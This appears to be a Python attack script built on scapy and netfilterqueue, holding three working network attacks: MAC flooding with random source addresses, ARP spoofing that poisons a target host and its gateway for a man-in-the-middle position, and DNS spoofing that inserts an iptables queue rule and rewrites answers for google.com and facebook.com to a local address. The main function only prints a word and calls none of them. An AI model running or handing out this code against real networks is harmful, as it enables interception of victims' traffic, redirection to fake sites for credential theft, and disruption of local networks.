#!/usr/bin/python
import sys
import scapy.all as scapy
import time
import os
import logging as log
from netfilterqueue import NetfilterQueue

#MAC Flooding
def MACFLOOD():
    destMAC = "FF:FF:FF:FF:FF:FF"
    while 1:
        scapy.sendp(scapy.Ether(src=scapy.RandMAC() ,dst=destMAC)/
        scapy.ARP(op=2, psrc="0.0.0.0", hwdst=destMAC)/scapy.Padding(load="X"*18),verbose=0)
#############################################################################################
#ARP Spoofing
def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc
  
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),
                                                            psrc = spoof_ip)
    scapy.send(packet, verbose = False)
  
  
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)

def ARPSPOOFMAIN():
    target_ip = "10.0.2.5" # Enter your target IP
    gateway_ip = "10.0.2.1" # Enter your gateway's IP
  
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
            time.sleep(2) # Waits for two seconds
    
    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")
####################################################################################
#DNS Spoof
class DnsSnoof:
    def __init__(self, hostDict, queueNum):
        self.hostDict = hostDict
        self.queueNum = queueNum
        self.queue = NetfilterQueue()
  
    def __call__(self):
        log.info("Snoofing....")
        os.system(
            f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
        self.queue.bind(self.queueNum, self.callBack)
        try:
            self.queue.run()
        except KeyboardInterrupt:
            os.system(
                f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
            log.info("[!] iptable rule flushed")
  
    def callBack(self, packet):
        scapyPacket = scapy.IP(packet.get_payload())
        if scapyPacket.haslayer(scapy.DNSRR):
            try:
                log.info(f'[original] { scapyPacket[scapy.DNSRR].summary()}')
                queryName = scapyPacket[scapy.DNSQR].qname
                if queryName in self.hostDict:
                    scapyPacket[scapy.DNS].an = scapy.DNSRR(
                        rrname=queryName, rdata=self.hostDict[queryName])
                    scapyPacket[scapy.DNS].ancount = 1
                    del scapyPacket[scapy.IP].len
                    del scapyPacket[scapy.IP].chksum
                    del scapyPacket[scapy.UDP].len
                    del scapyPacket[scapy.UDP].chksum
                    log.info(f'[modified] {scapyPacket[scapy.DNSRR].summary()}')
                else:
                    log.info(f'[not modified] { scapyPacket[scapy.DNSRR].rdata }')
            except IndexError as error:
                log.error(error)
            packet.set_payload(bytes(scapyPacket))
        return packet.accept()

def DNSSPOOFMAIN():
    try:
        hostDict = {
            b"google.com.": "192.168.1.100",
            b"facebook.com.": "192.168.1.100"
        }
        queueNum = 1
        log.basicConfig(format='%(asctime)s - %(message)s', 
                        level = log.INFO)
        snoof = DnsSnoof(hostDict, queueNum)
        snoof()
    except OSError as error:
        log.error(error)


def main():
   print("main")

if __name__ == "__main__":
    main()
